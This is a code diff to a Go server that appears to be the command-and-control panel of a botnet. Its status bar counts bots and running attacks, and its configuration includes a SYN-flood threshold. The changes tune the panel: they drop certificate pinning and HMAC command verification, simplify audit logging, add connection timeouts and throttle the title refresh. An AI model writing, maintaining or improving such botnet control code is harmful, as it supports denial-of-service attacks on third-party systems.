@@ -3,10 +3,8 @@ package main
 import (
 	"bufio"
 	"context"
-	"crypto/ecdsa"
 	"crypto/hmac"
 	"crypto/rand"
-	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
@@ -54,7 +52,6 @@ type Config struct {
 	MaxConnRate         int           `json:"max_conn_rate"`
 	SynFloodThreshold   int           `json:"syn_flood_threshold"`
 	ResetTokenValidity  time.Duration `json:"reset_token_validity"`
-	PinnedCertFile      string        `json:"pinned_cert_file"`
 	CommandSigningKey   string        `json:"command_signing_key"`
 }
 
@@ -153,8 +150,6 @@ type AggregatedStats struct {
 }
 
 type LogEntry struct {
-	entry AuditLog
-	done  chan struct{}
 }
 
 const (
@@ -205,9 +200,7 @@ var (
 		"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8",
 		"169.254.0.0/16", "224.0.0.0/4", "::1/128", "fc00::/7", "fe80::/10",
 	}
-	pinnedCert []byte
 	signingKey []byte
-	logQueue   chan LogEntry
 )
 
 func signCommand(cmd string) string {
@@ -216,44 +209,20 @@ func signCommand(cmd string) string {
 	return base64.StdEncoding.EncodeToString(mac.Sum(nil))
 }
 
-func verifyCommand(cmd, sig string) bool {
-	mac := hmac.New(sha256.New, signingKey)
-	mac.Write([]byte(cmd))
-	expectedSig := mac.Sum(nil)
-	decodedSig, err := base64.StdEncoding.DecodeString(sig)
-	if err != nil {
-		return false
-	}
-	return hmac.Equal(decodedSig, expectedSig)
-}
-
-func asyncLogger() {
-	for entry := range logQueue {
-		logData, err := json.Marshal(entry.entry)
-		if err == nil {
-			file, err := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
-			if err == nil {
-				file.Write(append(logData, '\n'))
-				file.Close()
-			}
-		}
-		close(entry.done)
-	}
-}
-
 func logAuditEvent(user, event, details string) {
-	entry := LogEntry{
-		entry: AuditLog{
-			Timestamp: time.Now(),
-			Event:     event,
-			User:      user,
-			IP:        "remote",
-			Details:   details,
-		},
-		done: make(chan struct{}),
+	logEntry := fmt.Sprintf("[%s] %s: %s - %s",
+		time.Now().Format("2006-01-02 15:04:05"),
+		user,
+		event,
+		details)
+	fmt.Println(logEntry) // Print to terminal
+
+	// Optional: Keep simple file logging without async
+	file, err := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
+	if err == nil {
+		fmt.Fprintln(file, logEntry)
+		file.Close()
 	}
-	logQueue <- entry
-	<-entry.done
 }
 
 func validateConfig() error {
@@ -288,8 +257,6 @@ func main() {
 	}
 
 	signingKey = []byte(cfg.CommandSigningKey)
-	logQueue = make(chan LogEntry, 1000)
-	go asyncLogger()
 
 	connSemaphore = make(chan struct{}, cfg.MaxConns)
 	if err := checkCertificates(); err != nil {
@@ -297,7 +264,6 @@ func main() {
 		os.Exit(1)
 	}
 
-	pinnedCert, _ = os.ReadFile(cfg.PinnedCertFile)
 	initializeAuditLog()
 	initializeRootUser()
 	setupFirewallRules()
@@ -323,46 +289,6 @@ func loadConfig() (*Config, error) {
 		return nil, err
 	}
 	return &config, nil
-}
-
-func verifyCertificate(rawCerts [][]byte) error {
-	if len(rawCerts) == 0 {
-		return fmt.Errorf("no certificates presented")
-	}
-	certPool := x509.NewCertPool()
-	if caCert, err := os.ReadFile(cfg.CertFile); err == nil {
-		certPool.AppendCertsFromPEM(caCert)
-	}
-	cert, err := x509.ParseCertificate(rawCerts[0])
-	if err != nil {
-		return fmt.Errorf("failed to parse peer cert: %v", err)
-	}
-	if _, err := cert.Verify(x509.VerifyOptions{Roots: certPool}); err != nil {
-		return fmt.Errorf("certificate verification failed: %v", err)
-	}
-	pinnedCertData, err := os.ReadFile(cfg.PinnedCertFile)
-	if err != nil {
-		return fmt.Errorf("failed to read pinned cert: %v", err)
-	}
-	pinnedCert, err := x509.ParseCertificate(pinnedCertData)
-	if err != nil {
-		return fmt.Errorf("failed to parse pinned cert: %v", err)
-	}
-	switch pubKey := cert.PublicKey.(type) {
-	case *rsa.PublicKey:
-		pinnedPubKey, ok := pinnedCert.PublicKey.(*rsa.PublicKey)
-		if !ok || pubKey.N.Cmp(pinnedPubKey.N) != 0 || pubKey.E != pinnedPubKey.E {
-			return fmt.Errorf("certificate doesn't match pinned cert")
-		}
-	case *ecdsa.PublicKey:
-		pinnedPubKey, ok := pinnedCert.PublicKey.(*ecdsa.PublicKey)
-		if !ok || pubKey.X.Cmp(pinnedPubKey.X) != 0 || pubKey.Y.Cmp(pinnedPubKey.Y) != 0 {
-			return fmt.Errorf("certificate doesn't match pinned cert")
-		}
-	default:
-		return fmt.Errorf("unsupported public key type")
-	}
-	return nil
 }
 
 func getTLSConfig() *tls.Config {
@@ -502,8 +428,9 @@ func handleUserConnection(conn net.Conn) {
 		removeClient(conn)
 	}()
 
-	// Add connection timeout
-	conn.SetDeadline(time.Now().Add(30 * time.Second))
+	conn.SetDeadline(time.Now().Add(30 * time.Second))      // connection timeout
+	conn.SetReadDeadline(time.Now().Add(30 * time.Second))  //  read timeout
+	conn.SetWriteDeadline(time.Now().Add(30 * time.Second)) //  write timeout
 
 	tlsConn, ok := conn.(*tls.Conn)
 	if !ok {
@@ -874,11 +801,16 @@ func setTitle(conn net.Conn, title string) {
 func updateTitle() {
 	spinChars := []rune{'⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'}
 	spinIndex := 0
-	for {
+	ticker := time.NewTicker(1 * time.Second) // Reduced from 100ms
+	defer ticker.Stop()
+
+	for range ticker.C {
+		// Cache values to avoid repeated calls
+		attackCount := attackManagerInstance.countAttacks()
+		botCount := getBotCount()
+		uptime := time.Since(serverStartTime).Round(time.Second)
+
 		for _, c := range clients {
-			attackCount := attackManagerInstance.countAttacks()
-			botCount := getBotCount()
-			uptime := time.Since(serverStartTime).Round(time.Second)
 			spinChar := spinChars[spinIndex]
 			title := fmt.Sprintf("%c━━━%c━━[User: %s]━━%c━━[Bots: %d]━━%c━━[Attacks: %d/%d]━━%c━━[Uptime: %s]━━%c━━━%c",
 				spinChar, spinChar, c.user.Username, spinChar, botCount, spinChar,
@@ -886,7 +818,6 @@ func updateTitle() {
 			setTitle(c.conn, title)
 		}
 		spinIndex = (spinIndex + 1) % len(spinChars)
-		time.Sleep(100 * time.Millisecond)
 	}
 }
 
